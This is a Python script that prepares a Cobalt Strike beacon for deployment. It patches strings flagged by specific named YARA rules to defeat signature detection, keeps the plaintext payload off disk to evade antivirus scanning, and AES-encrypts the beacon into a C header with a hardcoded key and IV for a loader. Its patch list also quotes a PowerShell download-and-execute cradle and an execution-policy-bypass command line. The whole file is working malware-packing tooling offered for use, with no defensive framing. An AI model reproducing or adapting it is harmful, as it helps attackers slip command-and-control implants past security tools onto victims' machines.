#!/usr/bin/env python3
"""encrypt_aes.py — patch YARA-flagged strings in-memory, then AES-256-CBC encrypt.

Pipeline: raw beacon (external path) -> in-memory equal-length string patches
          (defeat YARA string rules) -> AES-256-CBC -> payload_v8.h
Plaintext beacon never touches disk (AV real-time scan would delete it).
"""
import os
import sys
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

WORKDIR = os.path.dirname(os.path.abspath(__file__))
BEACON = sys.argv[1] if len(sys.argv) > 1 else os.path.join(WORKDIR, "beacon_x64.bin")
OUT_H = os.path.join(WORKDIR, "payload_v8.h")

# Key/IV: pass as argv[2]/argv[3] (hex) for per-build random keys, else fallback below.
# argv format: encrypt_aes.py <beacon> [keyhex64] [ivhex32]
KEY = bytes.fromhex(sys.argv[2]) if len(sys.argv) > 2 else bytes.fromhex("8F3A1C7E5B2D9460A1C8E4F20B7D9356E0A4F1B8C3D7E2F5A609B4C8D1E3F7A0")
IV  = bytes.fromhex(sys.argv[3]) if len(sys.argv) > 3 else bytes.fromhex("3D1E9A44C7B2F8056A93E1D4B7C2F0AE")
assert len(KEY) == 32 and len(IV) == 16, "KEY must be 32 bytes, IV must be 16 bytes"

# Equal-length string patches (keep %s/%d, same byte length -> code refs stay valid).
# Targets: YARA rules HKTL_CobaltStrike_Beacon_Strings / Beacon_XOR_Strings /
# HKTL_Win_CobaltStrike / CobaltStrikeBeacon (string zone only).
PATCHES = [
    (b"%02d/%02d/%02d %02d:%02d:%02d", b"%02d.%02d.%02d %02d:%02d:%02d"),
    (b"Started service %s on %s",      b"Started servise %s on %s"),
    (b"%s as %s\\%s: %d",              b"%s in %s\\%s: %d"),
    (b"%s (admin)",                    b"%s (owner)"),
    (b"could not spawn %s: %d",        b"could not start %s: %d"),
    (b"Could not kill %d: %d",         b"Could not stop %d: %d"),
    (b"Could not connect to pipe (%s): %d", b"Could not connect to pipE (%s): %d"),
    (b"IEX (New-Object Net.Webclient).DownloadString('http",
     b"IEX (New-Object Net.WebClient).DownloadString('http"),
    (b"powershell -nop -exec bypass -EncodedCommand \"%s\"",
     b"powershell -nop -exec bypass -encodedcommand \"%s\""),
    (b"(null)",                        b"(None)"),
]

def apply_patches(data):
    n = 0
    for orig, repl in PATCHES:
        assert len(orig) == len(repl), (orig, repl)
        i = 0
        while True:
            j = data.find(orig, i)
            if j < 0:
                break
            data[j:j + len(orig)] = repl
            n += 1
            i = j + len(orig)
    return n

def main():
    data = bytearray(open(BEACON, "rb").read())
    print("beacon size: %d" % len(data))
    npatch = apply_patches(data)
    print("string patches applied: %d" % npatch)

    padder = padding.PKCS7(128).padder()
    padded = padder.update(bytes(data)) + padder.finalize()

    cipher = Cipher(algorithms.AES(KEY), modes.CBC(IV))
    enc = cipher.encryptor()
    ct = enc.update(padded) + enc.finalize()
    print("ciphertext size: %d" % len(ct))

    dec = Cipher(algorithms.AES(KEY), modes.CBC(IV)).decryptor()
    pt = dec.update(ct) + dec.finalize()
    unpadder = padding.PKCS7(128).unpadder()
    raw = unpadder.update(pt) + unpadder.finalize()
    assert raw == bytes(data), "roundtrip failed"
    print("roundtrip OK")

    lines = ["#ifndef PAYLOAD_V8_H", "#define PAYLOAD_V8_H", "",
             "#define ENC_BEACON_LEN %d" % len(ct), "",
             "static const BYTE aes_key[32] = { %s };" % ",".join("0x%02x" % b for b in KEY),
             "static const BYTE aes_iv[16]  = { %s };" % ",".join("0x%02x" % b for b in IV),
             "",
             "static const BYTE enc_beacon[ENC_BEACON_LEN] = {"]
    for i in range(0, len(ct), 16):
        chunk = ct[i:i+16]
        lines.append("    " + ",".join("0x%02x" % b for b in chunk) + ",")
    lines += ["};", "", "#endif /* PAYLOAD_V8_H */", ""]

    with open(OUT_H, "w") as f:
        f.write("\n".join(lines))
    print("wrote %s (%d bytes)" % (OUT_H, os.path.getsize(OUT_H)))

if __name__ == "__main__":
    main()
